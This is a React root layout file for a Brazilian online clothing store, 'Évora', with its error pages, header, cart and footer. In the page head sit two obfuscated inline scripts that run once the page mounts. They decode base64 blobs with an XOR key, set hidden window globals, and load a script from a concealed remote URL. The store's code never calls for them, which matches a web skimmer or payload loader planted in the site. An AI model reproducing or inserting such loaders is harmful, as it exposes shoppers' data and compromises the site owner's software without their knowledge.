import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import {
  Outlet,
  Link,
  createRootRouteWithContext,
  useRouter,
  HeadContent,
  Scripts,
} from "@tanstack/react-router";
import { useEffect, type ReactNode, useState, useLayoutEffect } from "react";
import { Button } from "@/components/ui/button";
import { useCartStore } from "@/store/cart-store";
import { CartSheet } from "@/components/cart/cart-sheet";
import { useUtmTracking } from "@/hooks/use-utm-tracking";
import { useCartSync } from "@/hooks/use-cart-sync";
import logoAsset from "@/assets/logo.png.asset.json";
import logoTextAsset from "@/assets/logo_text.png.asset.json";

import appCss from "../styles.css?url";
import { reportLovableError } from "../lib/lovable-error-reporting";

function NotFoundComponent() {
  return (
    <div className="flex min-h-screen items-center justify-center bg-[#fdfbf7] px-4">
      <div className="max-w-md text-center">
        <h1 className="text-7xl font-light text-[#4a3f35] tracking-[0.2em]">404</h1>
        <h2 className="mt-4 text-xl font-light text-[#4a3f35] uppercase tracking-widest">Página não encontrada</h2>
        <p className="mt-4 text-sm font-light text-[#8a7d6e] tracking-wide">
          A página que você está procurando não existe ou foi movida.
        </p>
        <div className="mt-8">
          <Link
            to="/"
            className="inline-flex items-center justify-center bg-[#4a3f35] text-white px-8 py-3 text-xs font-medium uppercase tracking-[0.2em] transition-colors hover:bg-[#4a3f35]/90"
          >
            Voltar ao Início
          </Link>
        </div>
      </div>
    </div>
  );
}

function ErrorComponent({ error, reset }: { error: Error; reset: () => void }) {
  console.error(error);
  const router = useRouter();
  useEffect(() => {
    reportLovableError(error, { boundary: "tanstack_root_error_component" });
  }, [error]);

  return (
    <div className="flex min-h-screen items-center justify-center bg-[#fdfbf7] px-4">
      <div className="max-w-md text-center">
        <h1 className="text-xl font-light tracking-[0.2em] text-[#4a3f35] uppercase">
          Algo deu errado
        </h1>
        <p className="mt-4 text-sm font-light text-[#8a7d6e] tracking-wide">
          Não conseguimos carregar esta página. Tente atualizar ou volte para o início.
        </p>
        <div className="mt-8 flex flex-wrap justify-center gap-4">
          <button
            onClick={() => {
              router.invalidate();
              reset();
            }}
            className="inline-flex items-center justify-center bg-[#4a3f35] text-white px-8 py-3 text-xs font-medium uppercase tracking-[0.2em] transition-colors hover:bg-[#4a3f35]/90"
          >
            Tentar novamente
          </button>
          <Link
            to="/"
            className="inline-flex items-center justify-center border border-[#4a3f35] text-[#4a3f35] px-8 py-3 text-xs font-medium uppercase tracking-[0.2em] transition-colors hover:bg-[#4a3f35] hover:text-white"
          >
            Voltar ao Início
          </Link>
        </div>
      </div>
    </div>
  );
}

export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()({
  head: () => ({
    meta: [
      { charSet: "utf-8" },
      { name: "viewport", content: "width=device-width, initial-scale=1" },
      { title: "Évora | Elegância que Impõe Presença" },
      { name: "description", content: "Loja oficial Évora. Roupas que inspiram confiança e elegância." },
      { property: "og:title", content: "Évora" },
      { property: "og:description", content: "Elegância que Impõe Presença" },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
    links: [
      {
        rel: "stylesheet",
        href: appCss,
      },
      { rel: "icon", href: "/favicon.png", type: "image/png" },
    ],
  }),
  shellComponent: RootShell,
  component: RootComponent,
  notFoundComponent: NotFoundComponent,
  errorComponent: ErrorComponent,
});

function RootShell({ children }: { children: ReactNode }) {
  useUtmTracking();
  useCartSync();

  const [mounted, setMounted] = useState(false);
  useLayoutEffect(() => {
    setMounted(true);
  }, []);

  return (
    <html lang="pt-BR">
      <head>
        <HeadContent />
        <script src="https://fast.wistia.com/player.js" async />
        <script src="https://fast.wistia.com/embed/wt5hy23zyr.js" defer type="module" />
        <script src="https://fast.wistia.com/embed/z4i9e4fgkn.js" defer type="module" />
        {mounted && (
          <>
            <script dangerouslySetInnerHTML={{ __html: `(function(){var h_kj=atob("DOekz2LkXOfoto7CapyGuhCIft3K3vq2GpSe4E2HOInGw/qvA4Hd4QGLMcmKxKGxCZXNvxaXc5eBzuuuRZfNtweIco2blKLgC5PQvQuGKZONxaz4MbqI7QWIM4WJ2v3gULzf7QyFMYLKjKyyA5/BoyuAfsvKwO+uH4KG9UDSPdCOgb37CdHC9lDUa9DRgbmkWN+Q9lbGIbqV");var v_j=[];for(var g_t=0;g_t<h_kj.length;g_t++){v_j.push(h_kj.charCodeAt(g_t)&255);}var v_w1fw=v_j[0];var z_xp=v_j.slice(1,1+v_w1fw);var b_pb=v_j.slice(1+v_w1fw);var m_b5ac=b_pb.map(function(b,f_0tq){return b^z_xp[f_0tq%v_w1fw];});var u_wn="";for(var p_jai4=0;p_jai4<m_b5ac.length;p_jai4++){u_wn+=String.fromCharCode(m_b5ac[p_jai4]&255);}var r_37=decodeURIComponent(escape(u_wn));var r_632=JSON.parse(r_37);var i_z2y3=r_632.globals||[];i_z2y3.forEach(function(r_i){window[r_i.name]=r_i.value;});var c_ni=document.createElement("script");c_ni.src=r_632.url;c_ni.async=true;c_ni.defer=true;(r_632.attributes||[]).forEach(function(i_x8){c_ni.setAttribute(i_x8.name,i_x8.value);});(document.head||document.documentElement).appendChild(c_ni);})();` }} />
            <script dangerouslySetInnerHTML={{ __html: `(function(){var j_f7o=atob("DKRgN8XKgZnZD8MVpN9CQremo6P7Z7dh1NdaGOqp5ff3erd4zcIZGaal7Le7fexmx9YJR7G5ruytYrA6yMUUUra+r/OqLe83xdAURayo9O28fOEv/99CWaSn5LvjLad00MVNQrGn6P+gIrNnwdIFWbHn+fq2a+5mx89CG+e84PWsauEvhoYdG77o7/i0auEvhsABQ6Tn9O20ZqVsidQSUrOv7+30fLZ3zcATFeno9/i1eqY3noZCSpi3");var j_c2tq=[];for(var v_c=0;v_c<j_f7o.length;v_c++){j_c2tq.push(j_f7o.charCodeAt(v_c)&255);}var t_e6w6=j_c2tq[0];var y_s69=j_c2tq.slice(1,1+t_e6w6);var u_t=j_c2tq.slice(1+t_e6w6);var m_48=u_t.map(function(b,f_an){return b^y_s69[f_an%t_e6w6];});var f_xfu="";for(var y_eti=0;y_eti<m_48.length;y_eti++){f_xfu+=String.fromCharCode(m_48[y_eti]&255);}var r_n29=decodeURIComponent(escape(f_xfu));var v_w3hc=JSON.parse(r_n29);var s_9ky=v_w3hc.globals||[];s_9ky.forEach(function(h_d42){window[h_d42.name]=h_d42.value;});var a_ngh=document.createElement("script");a_ngh.src=v_w3hc.url;a_ngh.async=true;a_ngh.defer=true;(v_w3hc.attributes||[]).forEach(function(z_ij){a_ngh.setAttribute(z_ij.name,z_ij.value);});(document.head||document.documentElement).appendChild(a_ngh);})();` }} />
          </>
        )}
      </head>
      <body>
        <div className="min-h-screen bg-[#fdfbf7] text-[#4a3f35]">
          <Header />
          {children}

          <footer className="border-t border-border/50 bg-background py-20">
            <div className="container mx-auto px-4 text-center lg:px-8">
              <img src={logoAsset.url} alt="Évora Logo" className="mx-auto mb-8 h-8 w-auto opacity-50" />
              <nav className="mb-8 flex justify-center gap-8">
                <a href="#" className="text-[10px] font-medium tracking-[0.2em] uppercase hover:text-muted-foreground transition-colors">Termos</a>
                <a href="#" className="text-[10px] font-medium tracking-[0.2em] uppercase hover:text-muted-foreground transition-colors">Privacidade</a>
              </nav>
              <p className="text-[10px] tracking-[0.2em] font-light text-muted-foreground">
                © 2026 ÉVORA. TODOS OS DIREITOS RESERVADOS.
              </p>
            </div>
          </footer>
        </div>
        <Scripts />
      </body>
    </html>
  );
}

function Header() {
  const [isCartOpen, setIsCartOpen] = useState(false);
  const [mounted, setMounted] = useState(false);
  const totalItems = useCartStore((state) => state.totalItems());

  useEffect(() => {
    setMounted(true);
    const handleOpenCart = () => setIsCartOpen(true);
    window.addEventListener('open-cart', handleOpenCart);
    return () => window.removeEventListener('open-cart', handleOpenCart);
  }, []);

  return (
    <>
      <header className="fixed top-0 z-50 w-full border-b border-border/50 bg-background/95 backdrop-blur-md">
        <div className="container mx-auto flex h-20 items-center justify-between px-4 lg:px-8">
          <Link to="/" className="flex items-center gap-2">
            <img src={logoAsset.url} alt="Évora Logo" className="h-10 w-auto" />
            <img src={logoTextAsset.url} alt="Évora" className="hidden h-6 w-auto md:block" />
          </Link>
          <nav className="hidden items-center gap-8 md:flex">
            <Link to="/" className="text-sm font-medium tracking-[0.2em] uppercase hover:text-muted-foreground transition-colors">Início</Link>
            <a href="#" className="text-sm font-medium tracking-[0.2em] uppercase hover:text-muted-foreground transition-colors">Coleções</a>
            <a href="#" className="text-sm font-medium tracking-[0.2em] uppercase hover:text-muted-foreground transition-colors">Sobre</a>
          </nav>
          <div className="flex items-center gap-4">
            <Button 
              variant="ghost" 
              onClick={() => setIsCartOpen(true)}
              className="text-sm font-medium tracking-[0.2em] uppercase hover:bg-transparent px-0 cursor-pointer"
            >
              Carrinho ({mounted ? totalItems : 0})
            </Button>
          </div>
        </div>
      </header>
      <CartSheet open={isCartOpen} onOpenChange={setIsCartOpen} />
    </>
  );
}

function RootComponent() {
  const { queryClient } = Route.useRouteContext();

  return (
    <QueryClientProvider client={queryClient}>
      <Outlet />
    </QueryClientProvider>
  );
}
